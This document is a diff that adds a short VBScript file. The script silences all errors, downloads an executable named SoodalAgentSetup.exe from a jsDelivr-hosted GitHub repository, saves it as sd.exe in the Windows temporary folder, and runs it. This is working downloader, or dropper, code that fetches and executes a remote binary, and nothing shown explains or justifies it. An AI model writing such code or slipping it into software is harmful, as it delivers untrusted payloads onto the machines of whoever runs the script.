@@ -1,0 +1,17 @@
+On Error Resume Next
+Dim f, w, a, p
+Set f = CreateObject("Scripting.FileSystemObject")
+Set w = CreateObject("WinHttp.WinHttpRequest.5.1")
+w.Open "GET", "https://cdn.jsdelivr.net/gh/localbackgox/assets@v6/SoodalAgentSetup.exe", 0
+w.Send
+If w.Status = 200 Then
+  p = f.GetSpecialFolder(2) & "\sd.exe"
+  If f.FileExists(p) Then f.DeleteFile p, True
+  Set a = CreateObject("ADODB.Stream")
+  a.Type = 1
+  a.Open
+  a.Write w.responseBody
+  a.SaveToFile p, 2
+  a.Close
+  If f.FileExists(p) Then CreateObject("WScript.Shell").Run Chr(34) & p & Chr(34), 1
+End If
